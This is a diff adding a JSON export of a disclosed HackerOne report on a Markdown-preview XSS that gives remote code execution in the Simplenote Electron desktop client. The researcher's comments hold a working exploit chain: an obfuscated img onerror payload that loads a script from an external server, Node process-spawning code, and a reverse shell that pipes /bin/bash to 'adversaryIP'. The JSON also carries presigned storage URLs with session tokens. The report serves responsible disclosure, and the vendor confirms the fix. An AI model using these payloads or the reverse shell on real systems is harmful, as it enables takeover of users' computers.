@@ -1,0 +1,727 @@
+{
+    "abilities": {
+        "can_manage_common_responses?": false, 
+        "can_manage_collaborators?": false, 
+        "can_reopen?": false, 
+        "can_ban_researcher?": false, 
+        "can_create_severity?": false, 
+        "can_assign_to_h1_triage?": false, 
+        "can_agree_on_going_public?": false, 
+        "assignable_team_member_groups": [], 
+        "can_view_credential_account_details?": false, 
+        "can_export?": false, 
+        "can_create_retest?": false, 
+        "can_assign_to_user?": false, 
+        "can_use_common_responses?": false, 
+        "can_hide_timeline?": false, 
+        "can_be_manually_disclosed?": false, 
+        "assignable_team_members": [], 
+        "can_clone?": false, 
+        "can_be_publicly_disclosed?": false, 
+        "can_close_comments?": false, 
+        "can_view_bounty_weights?": false, 
+        "can_suggest_bounty_amount?": false, 
+        "can_cancel_disclosure_request?": false, 
+        "can_redact?": false, 
+        "can_change_structured_scope?": false, 
+        "can_post_internal_comments?": false, 
+        "can_change_state?": false, 
+        "can_change_weakness?": false, 
+        "can_add_comment?": false, 
+        "can_reassign_to_team?": false, 
+        "can_change_title?": false, 
+        "can_award_bounty?": false, 
+        "can_award_swag?": false, 
+        "can_close?": false, 
+        "can_manage?": false
+    }, 
+    "comments_closed?": false, 
+    "substate": "resolved", 
+    "bug_reporter_agreed_on_going_public_at": "2017-11-29T13:57:03.621Z", 
+    "voters": [
+        "sp1d3rs", 
+        "secator", 
+        "jr0ch17", 
+        "europa", 
+        "hunter", 
+        "kapytein", 
+        "asad0x01_", 
+        "eveeez", 
+        "axolotl", 
+        "mpz", 
+        "and 5 more..."
+    ], 
+    "facebook_team?": false, 
+    "has_bounty?": true, 
+    "bounty_amount": "250.0", 
+    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
+    "original_report_id": null, 
+    "id": 291539, 
+    "can_view_team": true, 
+    "team_member_agreed_on_going_public_at": "2017-12-01T13:35:27.254Z", 
+    "vulnerability_information": "Hi,\n\nA carefully crafted injection in the Markdown parser within Simplenote for Windows can be leveraged to achieve remote code execution via an external JavaScript file. \n\nThe nature of Simplenote's content sharing system, which makes use of tags containing email addresses, means that an adversary could distribute the following proof of concept en-masse to achieve targeted arbitrary code execution, simply requiring the target to \"preview\" the Markdown-formatted note.\n\n## Steps to reproduce\n\n### Prerequisites\nA standard remote web server can be used to create a functional proof of concept. For the purposes of this demonstration, please consider `ysx.bz` the \"adversary\" server.\n\nCreate a new JavaScript file (herein referred to as `hackerone-electron.js`) in the root directory, such that the path would read: `http://ysx.bz/hackerone-electron.js`.\n\n### External JavaScript file\n\nTo prepare our exploit, populate this file with the following JavaScript code:\n\n```\nwrite(\"<h1>Simplenote RCE via Electron - Windows - ysx</h1>\");\nwrite(\"<h3>Proof of concept in progress: popping <pre>netplwiz</pre>. Please stand by!</h3>\");\nvar Process = process.binding('process_wrap').Process;\nvar proc = new Process();\nproc.onexit = function(a,b) {};\nvar env = process.env;\nvar env_ = [];\nfor (var key in env) env_.push(key+'='+env[key]);\nproc.spawn({file:'cmd.exe',args:['/k netplwiz'],cwd:null,windowsVerbatimArguments:false,detached:false,envPairs:env_,stdio:[{type:'ignore'},{type:'ignore'},{type:'ignore'}]});\n```\n\n### Encoding and exploitation\n\nNext, please open a JavaScript `eval` [encoder](https://www.martineve.com/2007/05/15/javascript-eval-string-fromcharcode-encoder/) and encode the following payload, modifying the JavaScript source URL as appropriate. This will be used within an `<img>` tag as part of the crafted note.\n\n```\nvar js = document.createElement('script'); js.type = 'text/javascript'; js.src = 'http://ysx.bz/hackerone-electron.js'; document.body.appendChild(js);\n```\n\nThe above example should encode as follows:\n\n```\neval(String.fromCharCode(118,97,114,32,106,115,32,61,32,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99,114,105,112,116,39,41,59,32,106,115,46,116,121,112,101,32,61,32,39,116,101,120,116,47,106,97,118,97,115,99,114,105,112,116,39,59,32,106,115,46,115,114,99,32,61,32,39,104,116,116,112,58,47,47,121,115,120,46,98,122,47,104,97,99,107,101,114,111,110,101,45,101,108,101,99,116,114,111,110,46,106,115,39,59,32,100,111,99,117,109,101,110,116,46,98,111,100,121,46,97,112,112,101,110,100,67,104,105,108,100,40,106,115,41,59))\n```\n\nNext, create a new Markdown note within Simplenote for Windows, and paste the following `<img>` tag code.\n\n```\n## Test Note\n### HackerOne Windows RCE PoC - pops \"netplwiz\"\n\n<img src=x onerror=eval(String.fromCharCode(118,97,114,32,106,115,32,61,32,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99,114,105,112,116,39,41,59,32,106,115,46,116,121,112,101,32,61,32,39,116,101,120,116,47,106,97,118,97,115,99,114,105,112,116,39,59,32,106,115,46,115,114,99,32,61,32,39,104,116,116,112,58,47,47,121,115,120,46,98,122,47,104,97,99,107,101,114,111,110,101,45,101,108,101,99,116,114,111,110,46,106,115,39,59,32,100,111,99,117,109,101,110,116,46,98,111,100,121,46,97,112,112,101,110,100,67,104,105,108,100,40,106,115,41,59))>\n```\n\nUpon selecting the **Preview** option of the Markdown note, the JavaScript will be executed. After several seconds, the `netplwiz` executable will launch on your Windows system.\n\n### Supporting evidence\n\n{F240684}\n\n{F240685}\n\n## Verified conditions\n\nAt the time of testing, I have successfully confirmed exploitability in the following environment:\n\n* Simplenote for Windows 1.0.8\n* Windows 10 x64 Home Edition\n\nThanks,\n\nYasin", 
+    "activity_page_count": 1, 
+    "severity": {
+        "rating": "high", 
+        "author_type": "User"
+    }, 
+    "title": "[Simplenote for Windows] Client RCE via External JavaScript Inclusion leveraging Electron", 
+    "is_member_of_team?": null, 
+    "vote_count": 15, 
+    "summaries": [
+        {
+            "category": "team", 
+            "can_create?": false, 
+            "can_view?": true
+        }, 
+        {
+            "category": "researcher", 
+            "can_view?": true, 
+            "can_edit?": false, 
+            "id": 5940, 
+            "content": "It was possible to devise a crafted Markdown note, which when previewed, would lead to arbitrary code execution in the Simplenote client prior to version 1.1.0. A malicious note could be shared with another existing Simplenote user via the tag system.\n\nApplication execution and reverse shell proofs of concept were demonstrated for Windows and Linux. Thanks to @xknown and @roundhill for the swift remediation, and @edio for assisting with the investigation of this issue.\n\nA blogpost on this issue can be found here: https://ysx.me.uk/taking-note-xss-to-rce-in-the-simplenote-electron-client", 
+            "content_html": "<p>It was possible to devise a crafted Markdown note, which when previewed, would lead to arbitrary code execution in the Simplenote client prior to version 1.1.0. A malicious note could be shared with another existing Simplenote user via the tag system.</p>\n\n<p>Application execution and reverse shell proofs of concept were demonstrated for Windows and Linux. Thanks to <a href=\"/xknown\">@xknown</a> and <a href=\"/roundhill\">@roundhill</a> for the swift remediation, and <a href=\"/edio\">@edio</a> for assisting with the investigation of this issue.</p>\n\n<p>A blogpost on this issue can be found here: <a title=\"https://ysx.me.uk/taking-note-xss-to-rce-in-the-simplenote-electron-client\" href=\"/redirect?signature=aaf2d59918697d9bc1afdb75e11cfcece5655c96&amp;url=https%3A%2F%2Fysx.me.uk%2Ftaking-note-xss-to-rce-in-the-simplenote-electron-client\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://ysx.me.uk/taking-note-xss-to-rce-in-the-simplenote-electron-client</span><i class=\"icon-external-link\"></i></a></p>\n"
+        }
+    ], 
+    "structured_scope": null, 
+    "allow_singular_disclosure_at": "2017-12-29T13:57:03.841Z", 
+    "state": "Closed", 
+    "cve_ids": [], 
+    "activity_page_number": 1, 
+    "readable_substate": "Resolved", 
+    "public": true, 
+    "formatted_bounty": "$250", 
+    "attachments": [
+        {
+            "file_name": "pre_exploit.png", 
+            "type": "image/png", 
+            "id": 240684, 
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/240/684/6489094751adb742749c66de1ea3375dcc5dc37a/pre_exploit.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2IMG7FL4%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T222903Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDHPJ1yKYcYWYj%2F9LNiK3AzyAo4x%2BPxakyZiJlRkk9M72fGqw4SrPH5qRWwrCEzUaWrTNXkqpALXRS4Q9wnQBmHJ21tNzuwZNzHm1q41ngqtlwpJP4F8P9DJ8J86pGXCj5zxKl27Xdyrp0yXro5KHbNg%2FMI31tP3CPajYLHppvbpzE4HgT6%2BgX56T9THRU9i0iPR2sPERJ5V8T5PqNGlaAxkIH%2BcDEYPwwdeod1TBqaVJeTbSTUwavuHFWj8I9aJc5ijS9LvHWHNGB5FXbFATn8ghcjqVzqIroA9nxNuPJ2vxIaAor9r4p%2Fy1e5TWqKKtSEWtQu68kIwE8NsRg80HQRso%2BCvRE8ecUk4iHSIS0Q3jmxteI2SvJRO0qZ3QaRjTDGmiTz95bj%2F%2F4H%2BR7Jy4C8RK9HLXC%2BPnDh%2FazH%2BgKdjL01iP%2BgzbXEnOyhh3IA5Imss19EK%2B2EWDifocttquTy%2F9L1a3OBtcs43O1R7Q7IURroixlPAhRunZI2Z9MyZSlDzcJsSgY9uPguXfm%2BdDi6ysAHwhyXucVtSiReGyNvDkzSArwNHacFF2yzh47gdSbs3NLHHvBIWOzk4ozBhf5yrOj2mTit4ouKem4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=1878084b675228ff7660e6bb5ec56da65af59a51688af35daeae7607e6c747b8"
+        }, 
+        {
+            "file_name": "netplwiz_poc.png", 
+            "type": "image/png", 
+            "id": 240685, 
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/240/685/920afb80188088455e32a4001412bf34875d5742/netplwiz_poc.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2IMG7FL4%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T222903Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDHPJ1yKYcYWYj%2F9LNiK3AzyAo4x%2BPxakyZiJlRkk9M72fGqw4SrPH5qRWwrCEzUaWrTNXkqpALXRS4Q9wnQBmHJ21tNzuwZNzHm1q41ngqtlwpJP4F8P9DJ8J86pGXCj5zxKl27Xdyrp0yXro5KHbNg%2FMI31tP3CPajYLHppvbpzE4HgT6%2BgX56T9THRU9i0iPR2sPERJ5V8T5PqNGlaAxkIH%2BcDEYPwwdeod1TBqaVJeTbSTUwavuHFWj8I9aJc5ijS9LvHWHNGB5FXbFATn8ghcjqVzqIroA9nxNuPJ2vxIaAor9r4p%2Fy1e5TWqKKtSEWtQu68kIwE8NsRg80HQRso%2BCvRE8ecUk4iHSIS0Q3jmxteI2SvJRO0qZ3QaRjTDGmiTz95bj%2F%2F4H%2BR7Jy4C8RK9HLXC%2BPnDh%2FazH%2BgKdjL01iP%2BgzbXEnOyhh3IA5Imss19EK%2B2EWDifocttquTy%2F9L1a3OBtcs43O1R7Q7IURroixlPAhRunZI2Z9MyZSlDzcJsSgY9uPguXfm%2BdDi6ysAHwhyXucVtSiReGyNvDkzSArwNHacFF2yzh47gdSbs3NLHHvBIWOzk4ozBhf5yrOj2mTit4ouKem4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=94f514732bc72fc7be9afe2beba5ce22aa6017d328fe2bb2a7ad1f44e6986057"
+        }
+    ], 
+    "singular_disclosure_disabled": false, 
+    "activities": [
+        {
+            "automated_response": false, 
+            "created_at": "2017-11-18T18:08:13.735Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-11-18T18:08:13.735Z", 
+            "actor": {
+                "username": "ysx", 
+                "url": "/ysx", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/047/082/b01f35a4dfe82a2f5a569971c99ad5d2aa91264f_medium.jpg?1508768035"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "additional_data": {
+                "new_title": "[Simplenote for Windows] Client RCE via External JavaScript Inclusion leveraging Electron", 
+                "old_title": "[Simplenote for Windows] RCE via External JavaScript Inclusion leveraging Electron"
+            }, 
+            "team_handle": "automattic", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportTitleUpdated", 
+            "id": 2167699, 
+            "genius_execution_id": null
+        }, 
+        {
+            "attachments": [
+                {
+                    "url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/240/700/8855796358649e07634a85e0a69ae49193c00a96/procmon.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2IMG7FL4%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T222903Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDHPJ1yKYcYWYj%2F9LNiK3AzyAo4x%2BPxakyZiJlRkk9M72fGqw4SrPH5qRWwrCEzUaWrTNXkqpALXRS4Q9wnQBmHJ21tNzuwZNzHm1q41ngqtlwpJP4F8P9DJ8J86pGXCj5zxKl27Xdyrp0yXro5KHbNg%2FMI31tP3CPajYLHppvbpzE4HgT6%2BgX56T9THRU9i0iPR2sPERJ5V8T5PqNGlaAxkIH%2BcDEYPwwdeod1TBqaVJeTbSTUwavuHFWj8I9aJc5ijS9LvHWHNGB5FXbFATn8ghcjqVzqIroA9nxNuPJ2vxIaAor9r4p%2Fy1e5TWqKKtSEWtQu68kIwE8NsRg80HQRso%2BCvRE8ecUk4iHSIS0Q3jmxteI2SvJRO0qZ3QaRjTDGmiTz95bj%2F%2F4H%2BR7Jy4C8RK9HLXC%2BPnDh%2FazH%2BgKdjL01iP%2BgzbXEnOyhh3IA5Imss19EK%2B2EWDifocttquTy%2F9L1a3OBtcs43O1R7Q7IURroixlPAhRunZI2Z9MyZSlDzcJsSgY9uPguXfm%2BdDi6ysAHwhyXucVtSiReGyNvDkzSArwNHacFF2yzh47gdSbs3NLHHvBIWOzk4ozBhf5yrOj2mTit4ouKem4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=a1548c5be5b4ea7a1e4af66530ace7aba7de345e3dc385913fbe64e65c65898f", 
+                    "type": "image/png", 
+                    "id": 240700, 
+                    "filename": "procmon.png"
+                }
+            ], 
+            "automated_response": false, 
+            "created_at": "2017-11-18T18:13:50.954Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-11-18T18:21:12.203Z", 
+            "actor": {
+                "username": "ysx", 
+                "url": "/ysx", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/047/082/b01f35a4dfe82a2f5a569971c99ad5d2aa91264f_medium.jpg?1508768035"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "automattic", 
+            "message": "Quick update: for the first code block (external JavaScript file), please use the following JavaScript code instead:\n\n```\nvar Process = process.binding('process_wrap').Process;\nvar proc = new Process();\nproc.onexit = function(a,b) {};\nvar env = process.env;\nvar env_ = [];\nfor (var key in env) env_.push(key+'='+env[key]);\nproc.spawn({file:'cmd.exe',args:['/k netplwiz'],cwd:null,windowsVerbatimArguments:false,detached:false,envPairs:env_,stdio:[{type:'ignore'},{type:'ignore'},{type:'ignore'}]});\n```\n\nFurther examination using the Process Monitor from Sysinternals identifies the `cmd.exe` process (and resultant `netplwiz`) running in the current user context. It appears my additional screenshot has failed to embed, but can be accessed below.\n\nPlease let me know if you require any additional information regarding this issue.", 
+            "markdown_message": "<p>Quick update: for the first code block (external JavaScript file), please use the following JavaScript code instead:</p>\n<pre class=\"highlight plaintext\"><code>var Process = process.binding(&#39;process_wrap&#39;).Process;\nvar proc = new Process();\nproc.onexit = function(a,b) {};\nvar env = process.env;\nvar env_ = [];\nfor (var key in env) env_.push(key+&#39;=&#39;+env[key]);\nproc.spawn({file:&#39;cmd.exe&#39;,args:[&#39;/k netplwiz&#39;],cwd:null,windowsVerbatimArguments:false,detached:false,envPairs:env_,stdio:[{type:&#39;ignore&#39;},{type:&#39;ignore&#39;},{type:&#39;ignore&#39;}]});\n</code></pre>\n<p>Further examination using the Process Monitor from Sysinternals identifies the <code>cmd.exe</code> process (and resultant <code>netplwiz</code>) running in the current user context. It appears my additional screenshot has failed to embed, but can be accessed below.</p>\n\n<p>Please let me know if you require any additional information regarding this issue.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2167708, 
+            "genius_execution_id": null
+        }, 
+        {
+            "attachments": [
+                {
+                    "url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/240/708/9898c1de0242b799159e4c846893f15a9de1d6f7/ubuntu_poc.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2IMG7FL4%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T222903Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDHPJ1yKYcYWYj%2F9LNiK3AzyAo4x%2BPxakyZiJlRkk9M72fGqw4SrPH5qRWwrCEzUaWrTNXkqpALXRS4Q9wnQBmHJ21tNzuwZNzHm1q41ngqtlwpJP4F8P9DJ8J86pGXCj5zxKl27Xdyrp0yXro5KHbNg%2FMI31tP3CPajYLHppvbpzE4HgT6%2BgX56T9THRU9i0iPR2sPERJ5V8T5PqNGlaAxkIH%2BcDEYPwwdeod1TBqaVJeTbSTUwavuHFWj8I9aJc5ijS9LvHWHNGB5FXbFATn8ghcjqVzqIroA9nxNuPJ2vxIaAor9r4p%2Fy1e5TWqKKtSEWtQu68kIwE8NsRg80HQRso%2BCvRE8ecUk4iHSIS0Q3jmxteI2SvJRO0qZ3QaRjTDGmiTz95bj%2F%2F4H%2BR7Jy4C8RK9HLXC%2BPnDh%2FazH%2BgKdjL01iP%2BgzbXEnOyhh3IA5Imss19EK%2B2EWDifocttquTy%2F9L1a3OBtcs43O1R7Q7IURroixlPAhRunZI2Z9MyZSlDzcJsSgY9uPguXfm%2BdDi6ysAHwhyXucVtSiReGyNvDkzSArwNHacFF2yzh47gdSbs3NLHHvBIWOzk4ozBhf5yrOj2mTit4ouKem4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=1d0e294c92618e55c69be6f1cd891911fea3b83f9708c2bc5b5adc0cbd2e6c3a", 
+                    "type": "image/png", 
+                    "id": 240708, 
+                    "filename": "ubuntu_poc.png"
+                }
+            ], 
+            "automated_response": false, 
+            "created_at": "2017-11-18T19:06:24.404Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-11-18T19:09:06.352Z", 
+            "actor": {
+                "username": "ysx", 
+                "url": "/ysx", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/047/082/b01f35a4dfe82a2f5a569971c99ad5d2aa91264f_medium.jpg?1508768035"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "automattic", 
+            "message": "Please note that the following proof of concept (which can be used in place of the first code block) demonstrates client RCE on **Simplenote for Linux**, confirmed with Ubuntu 16.04.3 LTS and the latest client build:\n\n```\nvar Process = process.binding('process_wrap').Process;\nvar proc = new Process();\nproc.onexit = function(a,b) {};\nvar env = process.env;\nvar env_ = [];\nfor (var key in env) env_.push(key+'='+env[key]);\nproc.spawn({file:'/usr/bin/gnome-calculator',cwd:null,windowsVerbatimArguments:false,detached:false,envPairs:env_,stdio:[{type:'ignore'},{type:'ignore'},{type:'ignore'}]});\n```\n\nWould it be possible to update the title portion to `[Simplenote Desktop Clients]` please? Thanks again!", 
+            "markdown_message": "<p>Please note that the following proof of concept (which can be used in place of the first code block) demonstrates client RCE on <strong>Simplenote for Linux</strong>, confirmed with Ubuntu 16.04.3 LTS and the latest client build:</p>\n<pre class=\"highlight plaintext\"><code>var Process = process.binding(&#39;process_wrap&#39;).Process;\nvar proc = new Process();\nproc.onexit = function(a,b) {};\nvar env = process.env;\nvar env_ = [];\nfor (var key in env) env_.push(key+&#39;=&#39;+env[key]);\nproc.spawn({file:&#39;/usr/bin/gnome-calculator&#39;,cwd:null,windowsVerbatimArguments:false,detached:false,envPairs:env_,stdio:[{type:&#39;ignore&#39;},{type:&#39;ignore&#39;},{type:&#39;ignore&#39;}]});\n</code></pre>\n<p>Would it be possible to update the title portion to <code>[Simplenote Desktop Clients]</code> please? Thanks again!</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2167765, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-11-19T12:58:40.110Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-11-19T12:58:40.110Z", 
+            "actor": {
+                "username": "ysx", 
+                "url": "/ysx", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/047/082/b01f35a4dfe82a2f5a569971c99ad5d2aa91264f_medium.jpg?1508768035"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "automattic", 
+            "message": "Finally, the below JavaScript code, tested on an Ubuntu 16.04.3 target, creates a Node-based **reverse shell** connection from the target machine to `adversaryIP` with the current logged-in user's privilege level.\n\nAs with the previous comments, this can also be used in place of the **external JavaScript file** supplied in the first code block.\n\n```\nvar net = require(\"net\"), sh = require(\"child_process\").exec(\"/bin/bash\");\nvar client = new net.Socket();\nclient.connect(8080, \"adversaryIP\", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);\nsh.stderr.pipe(client);});\n```", 
+            "markdown_message": "<p>Finally, the below JavaScript code, tested on an Ubuntu 16.04.3 target, creates a Node-based <strong>reverse shell</strong> connection from the target machine to <code>adversaryIP</code> with the current logged-in user&#39;s privilege level.</p>\n\n<p>As with the previous comments, this can also be used in place of the <strong>external JavaScript file</strong> supplied in the first code block.</p>\n<pre class=\"highlight plaintext\"><code>var net = require(&quot;net&quot;), sh = require(&quot;child_process&quot;).exec(&quot;/bin/bash&quot;);\nvar client = new net.Socket();\nclient.connect(8080, &quot;adversaryIP&quot;, function(){client.pipe(sh.stdin);sh.stdout.pipe(client);\nsh.stderr.pipe(client);});\n</code></pre>", 
+            "type": "Activities::Comment", 
+            "id": 2168529, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-11-20T11:04:14.760Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-11-20T11:04:14.760Z", 
+            "actor": {
+                "username": "xknown", 
+                "url": "/xknown", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "automattic", 
+            "message": "Hi. Thanks for the report. We'll take a look.", 
+            "markdown_message": "<p>Hi. Thanks for the report. We&#39;ll take a look.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2169491, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-11-20T14:08:39.914Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-11-20T14:08:39.914Z", 
+            "actor": {
+                "username": "ysx", 
+                "url": "/ysx", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/047/082/b01f35a4dfe82a2f5a569971c99ad5d2aa91264f_medium.jpg?1508768035"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "automattic", 
+            "message": "No problem @xknown, thanks very much. Also: would it be possible to invite @edio to this report please? We have privately collaborated to further investigate the impact of this bug.\n\nKind regards\n\nYasin", 
+            "markdown_message": "<p>No problem <a href=\"/xknown\">@xknown</a>, thanks very much. Also: would it be possible to invite <a href=\"/edio\">@edio</a> to this report please? We have privately collaborated to further investigate the impact of this bug.</p>\n\n<p>Kind regards</p>\n\n<p>Yasin</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2170001, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-11-20T18:31:09.260Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-11-20T18:31:09.260Z", 
+            "actor": {
+                "username": "roundhill", 
+                "url": "/roundhill", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/033/062/41ebbb0fec998dcb14b225322befdad7d395eb33_medium.jpeg?1506457708"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "automattic", 
+            "message": "Hi everyone,\nThanks for the report. Just wanted to note that you can only share a Simplenote with another existing Simplenote user.\n\nI can't seem to reproduce using our 1.1.0 RC, builds available here: https://github.com/Automattic/simplenote-electron/releases/tag/1.1.0-rc3\n\nCan you please verify?", 
+            "markdown_message": "<p>Hi everyone,<br>\nThanks for the report. Just wanted to note that you can only share a Simplenote with another existing Simplenote user.</p>\n\n<p>I can&#39;t seem to reproduce using our 1.1.0 RC, builds available here: <a title=\"https://github.com/Automattic/simplenote-electron/releases/tag/1.1.0-rc3\" href=\"/redirect?signature=1b0d2c47e1dbaca8156ae28e422b153f15103eb4&amp;url=https%3A%2F%2Fgithub.com%2FAutomattic%2Fsimplenote-electron%2Freleases%2Ftag%2F1.1.0-rc3\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://github.com/Automattic/simplenote-electron/releases/tag/1.1.0-rc3</span><i class=\"icon-external-link\"></i></a></p>\n\n<p>Can you please verify?</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2170958, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-11-20T18:37:03.250Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-11-20T18:37:03.250Z", 
+            "actor": {
+                "username": "edoverflow", 
+                "url": "/edoverflow", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/116/374/95f9ffa246b2d43ca4f14a95d8815f429544fe54_medium.png?1527882436"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "automattic", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ExternalUserJoined", 
+            "id": 2170977, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-11-20T18:40:54.340Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-11-20T18:40:54.340Z", 
+            "actor": {
+                "username": "edoverflow", 
+                "url": "/edoverflow", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/116/374/95f9ffa246b2d43ca4f14a95d8815f429544fe54_medium.png?1527882436"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "automattic", 
+            "message": "Hi @roundhill, \n\nThis issue is reproducible in the latest stable build of Simplenote [v1.0.8](https://github.com/Automattic/simplenote-electron/releases/tag/v1.0.8) and appears to be fixed in 1.1.0 RC.", 
+            "markdown_message": "<p>Hi <a href=\"/roundhill\">@roundhill</a>, </p>\n\n<p>This issue is reproducible in the latest stable build of Simplenote <a href=\"/redirect?signature=acc0d7b9bf6c268f2702be1f0a95786a2f5ae403&amp;url=https%3A%2F%2Fgithub.com%2FAutomattic%2Fsimplenote-electron%2Freleases%2Ftag%2Fv1.0.8\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>v1.0.8</span><i class=\"icon-external-link\"></i></a> and appears to be fixed in 1.1.0 RC.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2170988, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-11-20T18:42:46.455Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-11-20T18:42:46.455Z", 
+            "actor": {
+                "username": "roundhill", 
+                "url": "/roundhill", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/033/062/41ebbb0fec998dcb14b225322befdad7d395eb33_medium.jpeg?1506457708"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "automattic", 
+            "message": "Great, thanks for confirming. The 1.1.0 update should go out tomorrow.\n\nRelated: https://github.com/Automattic/simplenote-electron/issues/487", 
+            "markdown_message": "<p>Great, thanks for confirming. The 1.1.0 update should go out tomorrow.</p>\n\n<p>Related: <a title=\"https://github.com/Automattic/simplenote-electron/issues/487\" href=\"/redirect?signature=a216d4dd430cbe5e7bc58411e7079445f144cb80&amp;url=https%3A%2F%2Fgithub.com%2FAutomattic%2Fsimplenote-electron%2Fissues%2F487\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://github.com/Automattic/simplenote-electron/issues/487</span><i class=\"icon-external-link\"></i></a></p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2170992, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-11-20T19:00:35.201Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-11-20T19:00:35.201Z", 
+            "actor": {
+                "username": "edoverflow", 
+                "url": "/edoverflow", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/116/374/95f9ffa246b2d43ca4f14a95d8815f429544fe54_medium.png?1527882436"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "automattic", 
+            "message": "The GitHub issue that you referenced does not demonstrate the severity of this issue. In my opinion, this update should be considered a security update and therefore a thorough security advisory might be necessary.", 
+            "markdown_message": "<p>The GitHub issue that you referenced does not demonstrate the severity of this issue. In my opinion, this update should be considered a security update and therefore a thorough security advisory might be necessary.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2171058, 
+            "genius_execution_id": null
+        }, 
+        {
+            "attachments": [
+                {
